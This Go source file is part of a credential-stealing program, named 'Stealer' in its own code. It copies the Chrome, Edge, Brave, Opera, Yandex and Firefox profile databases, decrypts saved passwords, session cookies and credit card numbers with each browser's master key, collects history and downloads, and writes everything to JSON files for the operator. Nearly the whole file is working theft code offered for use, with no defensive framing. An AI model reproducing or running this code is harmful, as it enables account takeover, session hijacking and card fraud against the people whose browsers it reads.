package main

import (
	"bytes"
	"database/sql"
	"fmt"
	"os"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

type BrowserDatabase struct {
	Logins    []Login
	Cookies   []Cookie
	History   []Site
	Downloads []Download
	Cards     []Card
}

type BrowserPaths struct {
	TempStorage  string
	DataBasePath string
	LocalState   string
}

type Browser struct {
	Name      string
	MasterKey []byte
	Paths     BrowserPaths
	Database  BrowserDatabase
	Extracted bool
}

func FormatBrowsersStolen(browsers []Browser) string {
	// Format the available wallet paths for embed
	if CountExtractedBrowsers(browsers) == 0 {
		return "No Browser Credentials Stolen"
	}

	// Create a buffer to store the formatted output
	var buffer bytes.Buffer

	// Write the header
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n", "Browser", "Logins", "Cookies", "History"))
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n", "-------", "------", "-------", "-------"))

	// Iterate through each browser and write its attributes to the table
	for _, browser := range browsers {
		if browser.Extracted {
			buffer.WriteString(fmt.Sprintf("%-10s %-10d %-10d %-10d\n",
				browser.Name,
				len(browser.Database.Logins),
				len(browser.Database.Cookies),
				len(browser.Database.History)))
		}
	}

	return buffer.String()
}

func CountExtractedBrowsers(browsers []Browser) (count int) {
	// Return a count of the number of extracted browsers using a simple iterator
	for _, browser := range browsers {
		if browser.Extracted {
			count += 1
		}
	}

	return count
}

func (stealer *Stealer) WriteBrowserJson() {
	// Write browser database structs as json objects to the Output directory
	var browserOutputPath = CleanPath(outputPath + "\\Browsers\\")
	if os.Mkdir(browserOutputPath, 0666) != nil {
		return
	}

	for _, browser := range stealer.Apps.Browsers {
		if !browser.Extracted {
			continue
		}

		browserFile := File{Path: CleanPath(browserOutputPath + "\\" + fmt.Sprintf("%s.json", browser.Name))}
		browserFile.WriteJson(browser.Database)
		browserFile.Move(browserOutputPath)
	}
}

func (browser *Browser) GetLogins() []Login {
	// Parse and decrypt all saved credentials from the Browsers 'Login Data' Database
	var DatabaseFile = "Login Data"

	// Copy the browsers database to our temp storage
	CopyFileToDirectory(browser.Paths.DataBasePath+DatabaseFile, browser.Paths.TempStorage)

	// Open the temporary database we copied to the temp path
	db, err := sql.Open("sqlite3", browser.Paths.TempStorage)
	if err != nil {
		fmt.Println(err)
		return browser.Database.Logins
	}
	defer browser.CloseBrowserDatabase(db)

	// Query the database
	rows, err := db.Query(QUERIES.Logins)
	if err != nil {
		fmt.Println(err)
	}
	defer rows.Close()

	for rows.Next() {
		// Scan the values in the current row into a new Login struct
		var newLogin Login

		// Temporary variables to scan unformatted row values into
		var createdUTC, lastUsedUTC int64

		if err := rows.Scan(
			&newLogin.URL,
			&newLogin.Username,
			&newLogin.Password,
			&createdUTC,
			&lastUsedUTC,
		); err != nil {
			fmt.Println(err)
			continue
		}

		// Convert the default storage of Unix times to a readable string format
		newLogin.Created = ConvertUnixTime(createdUTC)
		newLogin.LastUsed = ConvertUnixTime(lastUsedUTC)

		if strings.HasPrefix(newLogin.Password, "v10") {
			// Encrypted browser values with this marking require the browsers MasterKey for decryption
			newLogin.Password = strings.Trim(newLogin.Password, "v10")

			if string(browser.MasterKey) != "" {
				// Decrypt the encrypted cookie value using the browser master key
				plaintext := DecryptBrowserValue(newLogin.Password, browser.MasterKey)

				if string(plaintext) != "" {
					newLogin.Password = string(plaintext)
					browser.Database.Logins = append(browser.Database.Logins, newLogin)
				}
			} else {
				// Get the masterkey derived from this browsers LocalState path
				mkey, err := GetMasterKey(browser.Paths.LocalState)
				if err != nil {
					fmt.Println(err)
					continue
				}
				browser.MasterKey = mkey
			}
		} else {
			// Encrypted value does not need the browsers MasterKey for decryption
			pass, err := DecryptBytes([]byte(newLogin.Password))
			if err != nil {
				fmt.Println(err)
				continue
			}

			if newLogin.URL != "" && newLogin.Username != "" && string(pass) != "" {
				browser.Database.Logins = append(browser.Database.Logins, newLogin)
			}
		}
	}

	return browser.Database.Logins
}

func (browser *Browser) GetCookies() []Cookie {
	// Parse and decrypt all saved cookies from the Browsers 'Cookies' Database
	var DatabaseFile = "Network\\Cookies"

	// Copy the browsers database to our temp storage
	CopyFileToDirectory(browser.Paths.DataBasePath+DatabaseFile, browser.Paths.TempStorage)

	// Open the temporary database we copied to the temp path
	db, err := sql.Open("sqlite3", browser.Paths.TempStorage)
	if err != nil {
		fmt.Println(err)
	}
	defer browser.CloseBrowserDatabase(db)

	// Query the database
	rows, err := db.Query(QUERIES.Cookies)
	if err != nil {
		return browser.Database.Cookies
	}
	defer rows.Close()

	for rows.Next() {
		// Scan the values in the current row into a new Cookie struct
		var newCookie Cookie

		// Temporary variables to scan unformatted row values into
		var expires int8
		var createdUTC, expiryUTC int64

		if err := rows.Scan(
			&newCookie.Host,
			&newCookie.Name,
			&newCookie.Value,
			&createdUTC,
			&expires,
			&expiryUTC,
		); err != nil {
			fmt.Println(err)
			continue
		}

		// Conver the integer format of the `expires` value to a boolean
		newCookie.Expires = expires == 1

		// Convert the default storage of Unix times to a readable string format
		newCookie.Created = ConvertUnixTime(createdUTC)
		if newCookie.Expires {
			newCookie.ExpiryDate = ConvertUnixTime(expiryUTC)
		}

		if strings.HasPrefix(newCookie.Value, "v10") {
			// Encrypted browser values with this marking require the browsers MasterKey for decryption
			newCookie.Value = strings.Trim(newCookie.Value, "v10")

			if string(browser.MasterKey) != "" {
				// Decrypt the encrypted cookie value using the browser master key
				plaintext := DecryptBrowserValue(newCookie.Value, browser.MasterKey)

				if string(plaintext) != "" {
					newCookie.Value = string(plaintext)
					browser.Database.Cookies = append(browser.Database.Cookies, newCookie)
				}
			} else {
				// Get the masterkey derived from the browsers LocalState path
				mkey, err := GetMasterKey(browser.Paths.LocalState)
				if err != nil {
					continue
				}
				browser.MasterKey = mkey
			}
		} else {
			// Encrypted value does not need the browsers MasterKey for decryption
			pass, err := DecryptBytes([]byte(newCookie.Value))
			if err != nil {
				fmt.Println(err)
				continue
			}

			if newCookie.Host != "" && newCookie.Name != "" && string(pass) != "" {
				browser.Database.Cookies = append(browser.Database.Cookies, newCookie)
			}
		}
	}

	return browser.Database.Cookies
}

func (browser *Browser) GetHistory() ([]Site, []Download) {
	// Parse all saved Sites and Downloads from the Browsers 'History' Database

	// Values in the History database are not stored using encryption.
	// This means that we can just append them to our Database straight away
	var DatabaseFile = "History"

	// Copy the browsers database to our temp storage
	CopyFileToDirectory(browser.Paths.DataBasePath+DatabaseFile, browser.Paths.TempStorage)

	// Open the temporary database we copied to the temp path
	db, err := sql.Open("sqlite3", browser.Paths.TempStorage)
	if err != nil {
		return browser.Database.History, browser.Database.Downloads
	}
	defer browser.CloseBrowserDatabase(db)

	// Query the database
	siteRows, err := db.Query(QUERIES.History)
	if err != nil {
		fmt.Println(err)
	}
	defer siteRows.Close()

	// Query the database
	downloadRows, err := db.Query(QUERIES.Downloads)
	if err != nil {
		fmt.Println(err)
	}
	defer downloadRows.Close()

	// Iterate through both the urls/sites and downloads tables in the History Database
	for siteRows.Next() {
		// Scan the values in the current row into a new Site struct
		var newSite Site

		if err := siteRows.Scan(
			&newSite.URL,
			&newSite.Title,
			&newSite.Visits,
		); err != nil {
			fmt.Println(err)
			continue
		}

		browser.Database.History = append(browser.Database.History, newSite)
	}

	for downloadRows.Next() {
		// Scan the values in the current row into a new Download struct
		var newDownload Download

		// Temporary variable to scan unformatted download start time into
		var startTimeUTC int64

		if err := downloadRows.Scan(
			&startTimeUTC,
			&newDownload.CurrentPath,
			&newDownload.TargetPath,
			&newDownload.FileSource,
		); err != nil {
			fmt.Println(err)
			continue
		}

		// Convert the default storage of Unix times to a readable string format
		newDownload.Downloaded = ConvertUnixTime(startTimeUTC)

		browser.Database.Downloads = append(browser.Database.Downloads, newDownload)
	}

	return browser.Database.History, browser.Database.Downloads
}

func (browser *Browser) GetCards() []Card {
	// Parse and decrypt all saved credit cards from the Browsers 'Web Data' Database
	var DatabaseFile = "Web Data"

	// Copy the browsers database to our temp storage
	CopyFileToDirectory(browser.Paths.DataBasePath+DatabaseFile, browser.Paths.TempStorage)

	// Open the temporary database we copied to the temp path
	db, err := sql.Open("sqlite3", browser.Paths.TempStorage)
	if err != nil {
		fmt.Println(err)
	}
	defer browser.CloseBrowserDatabase(db)

	// Query the database
	rows, err := db.Query(QUERIES.Cards)
	if err != nil {
		fmt.Println(err)
	}
	defer rows.Close()

	for rows.Next() {
		// Scan the values in the current row into a new Card struct
		var newCard Card

		// Temporary variables to scan unformatted row values into
		var createdUTC int64

		if err := rows.Scan(
			&newCard.Name,
			&newCard.Number,
			&newCard.Expiry,
			&createdUTC,
		); err != nil {
			fmt.Println(err)
			continue
		}
		if strings.HasPrefix(newCard.Number, "v10") {
			// Encrypted browser values with this marking require the browsers MasterKey for decryption
			newCard.Number = strings.Trim(newCard.Number, "v10")

			if string(browser.MasterKey) != "" {
				// Decrypt the encrypted cookie value using the browser master key
				plaintext := DecryptBrowserValue(newCard.Number, browser.MasterKey)

				if string(plaintext) != "" {
					newCard.Number = string(plaintext)
					browser.Database.Cards = append(browser.Database.Cards, newCard)
				}
			} else {
				// Get the masterkey derived from the browsers LocalState path
				mkey, err := GetMasterKey(browser.Paths.LocalState)
				if err != nil {
					continue
				}
				browser.MasterKey = mkey
			}
		} else {
			// Encrypted value does not need the browsers MasterKey for decryption
			pass, err := DecryptBytes([]byte(newCard.Number))
			if err != nil {
				fmt.Println(err)
			}

			if newCard.Name != "" && string(pass) != "" {
				browser.Database.Cards = append(browser.Database.Cards, newCard)
			}
		}
	}

	return browser.Database.Cards
}

func (stealer *Stealer) GetBrowserCredentials() {
	defer TimeTrack(time.Now())

	// Get browser credentials from popular browsers using an iterative method
	for i, browser := range browserPaths {
		if !FileExists(browser.Paths.LocalState) {
			continue
		}

		browserPaths[i].Database.Logins = browser.GetLogins()
		browserPaths[i].Database.Cookies = browser.GetCookies()

		browserPaths[i].Database.History, browserPaths[i].Database.Downloads = browser.GetHistory()

		// This method of checking if credentials were extracted is not proper
		if len(browserPaths[i].Database.Logins) > 0 { // Check if any credentials have been extracted
			browserPaths[i].Extracted = true
		}
	}

	stealer.Apps.Browsers = browserPaths
	stealer.WriteBrowserJson()
}

var browserPaths = []Browser{
	{
		Name: "Chrome",
		Paths: BrowserPaths{
			TempStorage:  roaming + "\\tempchrome.dat",
			DataBasePath: local + "\\Google\\Chrome\\User Data\\Default\\",
			LocalState:   local + "\\Google\\Chrome\\User Data",
		},
	},
	{
		Name: "Edge",
		Paths: BrowserPaths{
			TempStorage:  roaming + "\\tempedge.dat",
			DataBasePath: local + "\\Microsoft\\Edge\\User Data\\Default\\",
			LocalState:   local + "\\Microsoft\\Edge\\User Data",
		},
	},
	{
		Name: "Brave",
		Paths: BrowserPaths{
			TempStorage:  roaming + "\\tempbrave.dat",
			DataBasePath: local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
			LocalState:   local + "\\BraveSoftware\\Brave-Browser\\User Data",
		},
	},
	{
		Name: "Opera",
		Paths: BrowserPaths{
			TempStorage:  roaming + "\\tempopera.dat",
			DataBasePath: local + "\\Opera Software\\Opera Stable\\",
			LocalState:   local + "\\Opera Software\\Opera Stable\\",
		},
	},
	{
		Name: "OperaGX",
		Paths: BrowserPaths{
			TempStorage:  roaming + "\\tempoperagx.dat",
			DataBasePath: local + "\\Opera Software\\Opera GX Stable\\",
			LocalState:   local + "\\Opera Software\\Opera GX Stable\\",
		},
	},
	{
		Name: "Yandex",
		Paths: BrowserPaths{
			TempStorage:  roaming + "\\tempyandex.dat",
			DataBasePath: local + "\\Yandex\\YandexBrowser\\User Data\\Default\\",
			LocalState:   local + "\\Yandex\\YandexBrowser\\User Data",
		},
	},
	{
		Name: "Firefox",
		Paths: BrowserPaths{
			TempStorage:  roaming + "\\tempfirefox.dat",
			DataBasePath: roaming + "\\Mozilla\\Firefox\\Profiles\\",
			LocalState:   roaming + "\\Mozilla\\Firefox\\Profiles",
		},
	},
	//Add more browsers here
}
